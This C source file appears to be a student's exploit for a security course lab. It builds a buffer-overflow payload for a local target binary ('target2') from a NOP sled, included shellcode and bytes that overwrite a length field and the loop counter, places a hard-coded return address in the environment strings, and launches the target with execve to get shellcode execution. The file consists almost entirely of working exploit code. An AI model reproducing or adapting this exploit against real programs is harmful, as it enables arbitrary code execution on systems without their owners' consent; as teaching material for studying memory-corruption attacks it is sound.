#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"
//#define NOP "\0x90"
// #define NOP "S"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[8];

	char NOP[] = "\x90";

	char exploit[512];

	//16 bytes
	strcpy(exploit, NOP);
	for(int i=0;i<15;i++){
		strcat(exploit, NOP);
	}

	//45bytes
	strcat(exploit, shellcode);

	//fill 264bytes in tatal
	for(int i = 61; i < 264; i++){
	    strcat(exploit, NOP);
	}

	//overwrite len with 0d288 = 0x120
	char len[] = "\x20\x01\x00\x00";

	//overwrite i with 0d272 = 0x110
	char i[] = "\x10\x01\x00\x00";

	//4+4 = 8 bytes
	strcat(exploit, "\x20\x01\x00");
	//strcat(exploit, i);

	// for(int i = 0; i < 32; i++){
	// 	strcat(exploit, "\xaa\xbb\xcc\xdd");
	// }
	
	//printf("%X\n", exploit[16]);

	args[0] = TARGET;
	args[1] = exploit;
	//args[1] = "hi";
	args[2] = NULL;

	//buf addr = 0x3021fd80

	env[0] = "\x00";
	env[1] = "\x10\x01";
	env[2] = "\x00";
	env[3] = "\x80\xfd\x21\x30\x80\xfd\x21\x30\x80\xfd\x21\x30";
	env[4] = "\x00";
	env[5] = "\x00";
	env[6] = "\x00";
	env[7] = "\x00";
	// \x00\x00\x00\x00\x80\xfd\x21\x30";



	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
